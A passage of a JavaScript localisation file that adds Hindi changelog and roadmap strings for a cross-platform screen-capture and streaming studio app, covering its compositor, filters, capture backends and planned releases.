प्रदर्शन गेट <strong>4 सोर्स के साथ 1080p पर 60 fps</strong> बनाए रखता है (RTX 4070 पर 5.2 ms/फ़्रेम मापा गया)।","changelog.63af29da5231":"<strong>ऐप का अपना सीन/सोर्स/फ़िल्टर मॉडल</strong> (<code>fcap-scene</code>): सीन क्रमबद्ध आइटम रखते हैं (इंडेक्स = z-क्रम); सोर्स एक साझा पूल में रहते हैं और कई सीन में संदर्भित होते हैं; आइटम ट्रांसफ़ॉर्म/ब्लेंड/दृश्यता/लॉक और एक क्रमबद्ध फ़िल्टर चेन रखते हैं। serde round-trip परीक्षण किया गया, अनजान कुंजियों को सहने वाला, लोड पर ख़ुद ठीक होने वाला — यही सीन-संग्रह का प्रोजेक्ट फ़ॉर्मैट है, जो OS की config डायरेक्टरी में <code>scene-collection.json</code> पर अपने-आप सहेजा जाता है (atomic, debounced)।","changelog.d4fa625cbe70":"<strong>GPU पर चलने वाली वीडियो फ़िल्टर चेन</strong>, हर आइटम के लिए और लाइव पैरामीटर के साथ: <strong>क्रोमा की</strong> (स्पिल दमन के साथ), <strong>कलर करेक्शन</strong> (gamma/चमक/कंट्रास्ट/संतृप्ति/रंगत/अपारदर्शिता), <strong>LUT</strong> (.cube → 3D lattice), <strong>ब्लर</strong> (separable gaussian), <strong>इमेज मास्क</strong> (alpha/luma, इनवर्ट), <strong>शार्पन</strong>, <strong>स्क्रॉल</strong> (लिपटता हुआ टिकर), और <strong>क्रॉप</strong> — क्रमबद्ध, टॉगल किए जा सकने वाले, और हर एक रेंडर किए गए पिक्सेल से सत्यापित। जिन फ़िल्टर की फ़ाइल लोड नहीं हुई, उन्हें छोड़ दिया जाता है, कभी काला रेंडर नहीं किया जाता।","changelog.fe58cb003f91":"<strong>नए सोर्स</strong>: <strong>इमेज</strong> (PNG/JPEG/BMP/GIF/WebP…), <strong>रंग</strong> (ठोस ब्लॉक), और <strong>टेक्स्ट</strong> — rustybuzz के ज़रिए असली shaping (अरबी जोड़, ligature, kerning), UAX #9 bidi RTL, शब्द रैप, संरेखण, पंक्ति अंतर, anti-aliased tiny-skia rasterization। <strong>पूरा Noto Sans परिवार बंडल किया गया है</strong> (variable फ़ॉन्ट: हर weight/width, upright + Italic + अरबी + हिब्रू; OFL-1.1 vendored, स्रोत पिन + हैश किया हुआ), <strong>हर run के लिए स्क्रिप्ट विकल्प</strong> के साथ, ताकि टेक्स्ट हर मशीन पर एक जैसा रेंडर हो; सिस्टम के फ़ॉन्ट परिवार चुने जा सकते हैं और फ़ॉन्ट फ़ाइल उन्हें override करती है।","changelog.4a4b0eca4f12":"<strong>स्टूडियो रनटाइम</strong>: कैप्चर सत्र और स्थिर सोर्स हर tick पर सक्रिय सीन से मिलान करते हैं; नए जोड़े गए आइटम अपने पहले फ़्रेम पर अपने-आप फ़िट होते हैं; कंपोज़ किया गया प्रोग्राम फ़्रेम ~60 पर कंपोज़ होते हुए उसी इन-प्रोसेस <code>preview://</code> पाइप को ~30 fps पर फ़ीड करता है; हर सोर्स की लाइव/प्रतीक्षा/त्रुटि स्थिति + कंपोज़ fps <code>program</code> इवेंट पर जाते हैं। बिना GPU वाली मशीन को जमे हुए कैनवस के बजाय ईमानदार &quot;कोई GPU नहीं&quot; रिपोर्ट मिलती है।","changelog.42c0a344221a":"<strong>स्टूडियो UI</strong>: काम करने वाली <strong>सीन</strong> रेल (जोड़ें/चुनें/नाम बदलें/क्रम बदलें/हटाएँ), हर आइटम की दृश्यता/लॉक/z-क्रम/स्थिति वाली एक <strong>सोर्स</strong> रेल और हर लागू किए गए प्रकार को कवर करने वाला जोड़ें मेन्यू (साथ में सीन के बीच सोर्स साझा करना), <strong>कैनवस पर पिक्सेल-सटीक ट्रांसफ़ॉर्म हैंडल</strong> (खींचना, कोने/किनारे से स्केल, 15° स्नैप के साथ घुमाना, Alt-खींचकर क्रॉप), एक <strong>फ़िल्टर</strong> डायलॉग (ब्लेंड मोड + लाइव संपादन योग्य चेन), और हर प्रकार के लिए <strong>प्रॉपर्टीज़</strong> डायलॉग।","changelog.eaef04a3aa25":"दायरे के बारे में ईमानदार नोट्स","changelog.52f9e72e5682":"<strong>मीडिया</strong> (वीडियो फ़ाइलें) को <strong>रिकॉर्डिंग चरण में शामिल कर दिया गया है</strong> (2026-07-02 को तय): यह wire-कोडेक / हार्डवेयर-डिकोड आर्किटेक्चर (ज़रूरत पड़ने पर ffmpeg) पर चलता है — शुद्ध-Rust वाला कोई सामान्य वीडियो डिकोडर मौजूद नहीं है, और stub चार्टर के ख़िलाफ़ हैं।","changelog.9f015d62a029":"<strong>ब्राउज़र सोर्स</strong> एक <strong>offscreen-webview डिज़ाइन स्पाइक</strong> के बाद स्ट्रीमिंग-गहराई वाले चरण में चला जाता है (Tauri v2 क्रॉस-प्लेटफ़ॉर्म रूप से webview को texture में रेंडर नहीं कर सकता)।","changelog.fb9378d724c2":"<strong>CJK टेक्स्ट</strong> फ़िलहाल सिस्टम फ़ॉन्ट इस्तेमाल करता है — Noto CJK (~100 MB) बंडल नहीं है; बंडल किया गया समूह लैटिन/ग्रीक/सिरिलिक + अरबी + हिब्रू को कवर करता है।","changelog.30f499446f84":"रुख़ नहीं बदला है: कंपोज़ किए गए प्रोग्राम फ़्रेम CORS-पिन किए गए <code>preview://</code> scheme के पीछे <strong>इन-प्रोसेस</strong> रहते हैं; स्टूडियो जो एकमात्र फ़ाइल लिखता है, वह लोकल सीन संग्रह है। नई थर्ड-पार्टी निर्भरताएँ (<code>wgpu</code> का रनटाइम उपयोग, <code>image</code>, <code>tiny-skia</code>, <code>fontdb</code>, <code>unicode-bidi</code>, <code>pollster</code>) अनुमेय लाइसेंस वाली हैं और <code>THIRD-PARTY-NOTICES.md</code> में दर्ज हैं।","changelog.19084c726e61":"[0.25.0] — 2026-07-01 (कैप्चर कोर)","changelog.a7a34cfb1a75":"ऐप के अपने <code>fcap-capture</code> इंटरफ़ेस के पीछे <strong>हर OS के लिए स्क्रीन और विंडो कैप्चर</strong>, जो एक latest-wins चैनल के ज़रिए समय-मुहर वाले, GPU पर अपलोड किए जा सकने वाले फ़्रेम देता है, छूटे फ़्रेमों की ईमानदार गिनती के साथ:","changelog.871ef2f6ec64":"<strong>Windows</strong> — डिस्प्ले के लिए DXGI Desktop Duplication (माउस पॉइंटर ब्लेंडिंग के साथ; duplication में कर्सर शामिल नहीं होता) और अलग-अलग विंडो के लिए <strong>Windows.Graphics.Capture</strong> (Windows 10 1903+), जो डिस्प्ले-मोड बदलने और विंडो का आकार बदलने के बाद भी चलते रहते हैं।","changelog.6beba9cca1b5":"<strong>macOS</strong> — <strong>ScreenCaptureKit</strong> (डिस्प्ले + विंडो, macOS 12.3+); स्क्रीन-रिकॉर्डिंग अनुमति पहले ही माँगी जाती है, और मना करने पर चुपचाप काले फ़्रेम के बजाय <strong>स्क्रीन रिकॉर्डिंग सेटिंग्स खोलें</strong> डीप-लिंक दिखता है। (बंडल का न्यूनतम संस्करण 12.0 → 12.3 किया गया — 12.3 से नीचे ScreenCaptureKit मौजूद नहीं है।)","changelog.181ee179e017":"<strong>Linux</strong> — Wayland पर <strong>ScreenCast portal</strong> (<code>ashpd</code> → PipeWire), जहाँ <em>सिस्टम डायलॉग</em> स्क्रीन या विंडो चुनता है (Wayland केवल यही कैप्चर करने देता है — पिकर यह साफ़-साफ़ बताता है), साथ में X सत्रों पर एक सीधा <strong>X11</strong> रास्ता (स्क्रीन + <code>_NET_CLIENT_LIST</code> विंडो)।","changelog.2c3347e661da":"<code>nokhwa</code> के ज़रिए <strong>वेबकैम / कैप्चर-कार्ड</strong> सोर्स (Media Foundation / AVFoundation / V4L2): डिवाइस गणना, हर डिवाइस के फ़ॉर्मैट की सूची (रिज़ॉल्यूशन / fps / wire फ़ॉर्मैट), लाइव RGBA फ़्रेम, और macOS कैमरा-अनुमति फ़्लो (<code>NSCameraUsageDescription</code> बंडल किया गया)।","changelog.eb1065b2fc17":"<strong>लाइव प्रोग्राम प्रीव्यू</strong>: सोर्स रेल का “+” अब काम करता है — डिस्प्ले कैप्चर, विंडो कैप्चर और वीडियो कैप्चर डिवाइस पिकर; चुना गया सोर्स प्रोग्राम प्रीव्यू में लाइव रेंडर होता है, लेबल / रिज़ॉल्यूशन / मापे गए fps / छूटे फ़्रेम वाले ओवरले के साथ। पाइप शुरू से अंत तक इन-प्रोसेस है (कैप्चर → JPEG → ऐप का निजी <code>preview://</code> scheme → canvas) — फ़्रेम कभी किसी सॉकेट या डिस्क को नहीं छूते। सीधा ड्रॉ पाइप को साबित करता है; 0.40.0 में wgpu कंपोज़िटर ज़िम्मेदारी सँभाल लेता है।","changelog.e3fc6c640b84":"<strong>लाइव-हार्डवेयर smoke परीक्षण</strong> (headless CI पर <code>--ignored</code> रखे गए): डिस्प्ले, विंडो और वेबकैम कैप्चर असली हार्डवेयर पर असली फ़्रेम के साथ सत्यापित।","changelog.c326134a5d1e":"प्रीव्यू फ़्रेम <strong>इन-प्रोसेस</strong> रहते हैं (एक कस्टम URI scheme — न localhost सॉकेट, न अस्थायी फ़ाइलें); रुख़ नहीं बदला है: शून्य बाहरी नेटवर्क कॉल, न कोई खाता, न टेलीमेट्री।","changelog.38a90eaf4fce":"OS की अनुमति न मिलने (macOS स्क्रीन रिकॉर्डिंग / कैमरा) की स्थिति सेटिंग्स डीप-लिंक के साथ ईमानदारी से दिखाई जाती है।","changelog.c6a63e383dbf":"नई थर्ड-पार्टी सूचनाएँ: <code>pipewire</code> + <code>x11rb</code> (Linux कैप्चर) और <code>mozjpeg</code> (वेबकैम MJPEG डिकोड) + <code>jpeg-encoder</code> (प्रीव्यू एनकोड) — बाद वाले दोनों <strong>IJG</strong> लाइसेंस के तहत हैं, जिसे अब <code>THIRD-PARTY-NOTICES.md</code> में स्वीकार किया गया है और <code>deny.toml</code> में अनुमति दी गई है।","changelog.2f1e03606026":"[0.10.0] — 2026-07-01 (नींव और रिपॉज़िटरी)","changelog.4648ce7198c9":"Rust Cargo workspace के ऊपर <strong>Tauri v2 + React 19 / TypeScript / Vite 7 / Tailwind 4</strong> कंट्रोल UI (Havoc dark): <code>freally-capture</code> ऐप क्रेट + ऐप के अपने <code>fcap-*</code> इंजन क्रेट (<code>capture</code>, <code>sources</code>, <code>compositor</code>, <code>scene</code>, <code>audio</code>, <code>encode</code>, <code>stream</code>), सभी <code>#![forbid(unsafe_code)]</code>।","changelog.b146fa224118":"<strong>स्टूडियो डॉक लेआउट</strong> (बड़ा प्रोग्राम प्रीव्यू, सीन/सोर्स रेल, ऑडियो मिक्सर, नियंत्रण, आँकड़े), हर नियंत्रण पर ईमानदार &quot;अभी लागू नहीं&quot; स्थितियों के साथ।","changelog.6b08ed4da71e":"<strong>टाइप किया हुआ UI ↔ कोर ब्रिज</strong>: <code>health()</code> (ऐप + जुड़े हुए कोर-क्रेट के संस्करण), <code>settings_get</code>/<code>settings_set</code>, और ~2 Hz वाला एक <code>stats</code> push इवेंट जो स्टैट्स डॉक में लाइव रेंडर होता है (प्लेसहोल्डर डेटा, जिसे 0.70.0 में असली सैंपलिंग आने तक ऐसा ही लेबल किया गया है)।","changelog.29f30cb39613":"<strong>सेटिंग्स स्टोर</strong>: OS की config डायरेक्टरी में JSON, atomic temp-file+rename लेखन, दूषित/गायब फ़ाइल के लिए विकल्प; स्टैट्स-डॉक टॉगल हर बार चलाने पर बना रहता है।","changelog.68352e507bf1":"<strong>CI मैट्रिक्स</strong> (Windows/macOS/Linux): rustfmt, clippy <code>-D warnings</code>, परीक्षण, cargo-deny + cargo-audit, UI prettier/eslint/tsc/vitest/build, और हर OS के Tauri debug बिल्ड; टैग से शुरू होने वाला एक <strong>रिलीज़ वर्कफ़्लो</strong> (हर OS के इंस्टॉलर → ड्राफ़्ट GitHub Release)।","changelog.77fbaa6cd383":"प्रोप्राइटरी <code>LICENSE</code> + गवर्नेंस दस्तावेज़ और true-alpha बैज आइकन के साथ शुरुआती <code>docs/</code> GitHub Pages साइट।","changelog.b36a760b89c7":"<strong>Windows रिलीज़ सत्यापित</strong>: <strong>बिना कंसोल विंडो</strong> वाला GUI ऐप (बने हुए बाइनरी पर जाँचा गया); MSI + NSIS इंस्टॉलर बनते हैं।","changelog.5da8006aa5c6":"ऐप में <strong>शून्य बाहरी नेटवर्क कॉल</strong>; एक सख़्त CSP; सिर्फ़ न्यूनतम <code>core:default</code> क्षमता; स्ट्रीम कुंजियाँ/secrets सहेजे नहीं जाते (अभी कोई है ही नहीं); <strong>कहीं भी AI/ML नहीं</strong> (चार्टर)।","changelog.62e65d7911da":"योजना — 0.25.0 (कैप्चर कोर)","changelog.216d50682cb6":"एक <code>Capture</code> इंटरफ़ेस के पीछे हर OS के लिए स्क्रीन/विंडो कैप्चर (Windows DXGI + Windows.Graphics.Capture; macOS ScreenCaptureKit; Linux PipeWire portal + X11)।","changelog.22b2b1c3d027":"<code>nokhwa</code> के ज़रिए वेबकैम / कैप्चर-कार्ड इनपुट; एक लाइव प्रोग्राम प्रीव्यू।","changelog.8716e909baa8":"योजना — 0.40.0 (कंपोज़िटर + सीन/सोर्स)","changelog.42125f1329d8":"ऐप का अपना <code>wgpu</code> GPU कंपोज़िटर: हर सोर्स का ट्रांसफ़ॉर्म/क्रॉप/स्केल/घुमाव, ब्लेंड मोड, और वीडियो फ़िल्टर चेन (क्रोमा की, कलर करेक्शन, LUT, ब्लर, मास्क, शार्पन, स्क्रॉल)।","changelog.5e0cc21c74cc":"ऐप का अपना सीन/सोर्स/फ़िल्टर डेटा मॉडल; सोर्स का पूरा समूह (इमेज, टेक्स्ट, रंग, मीडिया, ब्राउज़र); कैनवस पर ट्रांसफ़ॉर्म हैंडल के साथ सीन + सोर्स रेल।","changelog.25af1c9ae9bd":"योजना — 0.55.0 (ऑडियो मिक्सर + रिकॉर्डिंग)","changelog.c33ce0f2f787":"<code>cpal</code> ऑडियो ग्राफ़: हर सोर्स का वॉल्यूम/म्यूट/मॉनिटर, 6 तक ट्रैक, सिंक ऑफ़सेट, डकिंग, पुश-टू-टॉक, एक LUFS मीटर, और फ़िल्टर (ऐप का अपना क्लासिक-DSP डीनॉइज़ — कोई ML नहीं — साथ में गेट, कंप्रेसर, लिमिटर, EQ, गेन)।","changelog.e1afeb62fe94":"हार्डवेयर एनकोडर (NVENC/Quick Sync/AMF/VAAPI/VideoToolbox) + x264 विकल्प के ज़रिए मल्टी-ट्रैक रिकॉर्डिंग, साथ में ऐप का अपना <code>freally-video</code> लॉसलेस कोडेक; कंटेनर mp4/mkv/mov/webm; फ़ाइल विभाजन; अलग-ट्रैक वाली लोकल कॉपी। पेटेंट से बँधे wire कोडेक ज़रूरत पड़ने पर डाउनलोड होने वाले, हैश से सत्यापित ffmpeg ब्रिज के ज़रिए।","changelog.b03b02234da0":"योजना — 0.70.0 (स्टूडियो MVP — पहली सार्वजनिक रिलीज़)","changelog.2f588cc01f93":"Twitch/YouTube/Kick/Facebook/Trovo/कस्टम पर एक-लक्ष्य लाइव स्ट्रीमिंग (RTMP/RTMPS), अपने-आप फिर से जुड़ने और स्ट्रीम डिले के साथ; मुख्य रिकॉर्डिंग स्ट्रीम की स्थिति से बेपरवाह चलती रहती है।","changelog.8591c913ffa0":"स्टूडियो मोड (प्रीव्यू/प्रोग्राम) + ट्रांज़िशन (कट/फ़ेड/स्लाइड/स्वाइप/स्टिंगर/luma-wipe); वर्चुअल कैमरा (हर OS के लिए); ग्लोबल हॉटकी; प्रोफ़ाइल + सीन संग्रह; स्टैट्स डॉक। <strong>पहला सार्वजनिक बिल्ड — पूरी तरह मुफ़्त, हर Freally ऐप की तरह।</strong>","changelog.ae9d61fc4bdf":"योजना — 0.85.0 (मल्टीस्ट्रीम / SRT / WHIP + सीन/सोर्स/एनकोडर की गहराई)","changelog.384e7dfb96e1":"एक साथ कई लक्ष्यों पर मल्टीस्ट्रीम, हर प्लेटफ़ॉर्म पर सीधे; SRT और WHIP प्रोटोकॉल; वर्टिकल/मल्टी-कैनवस आउटपुट।","changelog.0cb0b6d267f0":"प्रीसेट के साथ लगातार चलने वाला रीप्ले बफ़र; नेस्टेड सीन, सोर्स समूह + हर सीन का ऑडियो; इमेज-स्लाइडशो सोर्स + कैप्चर-कार्ड प्रीसेट; कलर/luma-की + रेंडर-डिले फ़िल्टर; ऊँचे FPS/4K आउटपुट, कलर-स्पेस प्रबंधन + आउटपुट डाउनस्केल; रिकॉर्डिंग की ओर के स्ट्रीम मार्कर; वर्चुअल-कैमरा की गहराई (एक सोर्स + ऑडियो); प्रीमियम स्टिंगर + luma पैक; उन्नत फ़िल्टर।","changelog.060db9595543":"योजना — 1.0.0 (रिमोट API, स्क्रिप्टिंग, गेम कैप्चर और लॉन्च)","changelog.26a3256fb4c7":"WebSocket रिमोट-कंट्रोल API (Stream Deck / Companion जैसा) + ब्राउज़र डॉक; Lua/JS स्क्रिप्टिंग + एक प्लगइन SDK।","changelog.bde34ffd89b3":"गेम कैप्चर (DX/GL/Vulkan GPU-API हुकिंग, ईमानदारी से चिह्नित); वैकल्पिक NDI + VST।","changelog.fdf05cb85cbf":"साइन किए गए/notarize किए गए इंस्टॉलर (Win MSI/NSIS, macOS .app/.dmg + वर्चुअल-कैमरा प्लगइन, Linux AppImage/.deb/.rpm/Flatpak) + स्व-होस्टेड ऑटो-अपडेट।","changelog.28cee61c3ca1":"सुगम्यता (कीबोर्ड को प्राथमिकता, स्क्रीन-रीडर के लिए लेबल, हाई-कंट्रास्ट) और UI का 18 भाषाओं में स्थानीयकरण (<code>ar de en es fr hi id it ja ko nl pl pt-BR ru tr uk vi zh-CN</code>, पहले अंग्रेज़ी, RTL अरबी); ऑनबोर्डिंग + टेम्पलेट।"}; for (var k in add) mine[k] = add[k]; })(window.CAPTURE_I18N = window.CAPTURE_I18N || {});
